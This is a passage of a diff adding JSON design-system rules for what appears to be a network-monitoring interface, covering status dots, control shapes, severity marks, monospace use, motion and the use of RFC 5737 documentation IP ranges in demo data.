+      },
+      {
+        "name": "The Flat Dot Rule",
+        "body": "Status dots (capture LED, expert-info dot, status pill) are flat filled circles: no glow halos, no pulsing.",
+        "section": "elevation"
+      },
+      {
+        "name": "The Rectangular Vocabulary Rule",
+        "body": "Every control is a 4px rectangle (3px for inset badges and keys). No pill buttons, no large-radius cards.",
+        "section": "shapes"
+      }
+    ],
+    "dos": [
+      "**Do** use the accent (#2a62b8 light) only for selection, focus rings, and primary actions.",
+      "**Do** tint only untriaged alert rows; drop acknowledged, false-positive, and muted rows to Pane White with Secondary Ink.",
+      "**Do** pair every severity colour with its mark: hollow circle low, dot medium, triangle high, diamond critical.",
+      "**Do** keep monospace to addresses, ports, bytes, timestamps, and byte or pattern fields.",
+      "**Do** build controls from the 4px rectangle (3px for inset badges and keys).",
+      "**Do** draw icons as 16px stroked SVG (1.7 stroke, round caps) from the inline sprite.",
+      "**Do** keep motion state-only at 150 to 200ms ease-out, and honour reduced motion.",
+      "**Do** use only RFC 5737 documentation ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) for external hosts in demo data and examples; internal demo hosts stay on a private LAN range."
+    ],
+    "donts": [
+      "**Don't** build a KPI tile grid; the overview is one summary line over the I/O strip.",
+      "**Don't** give status dots glow halos or pulsing animation.",
+      "**Don't** signal severity by colour alone or introduce a second accent colour.",
+      "**Don't** set signature names, counts, or prose in monospace.",
+      "**Don't** use pill-shaped buttons or large-radius cards.",
+      "**Don't** add shadows to panes, rows, or controls; shadows belong to floating layers only.",
+      "**Don't** load web fonts or icon fonts from a CDN."
+    ]
+  }
+}
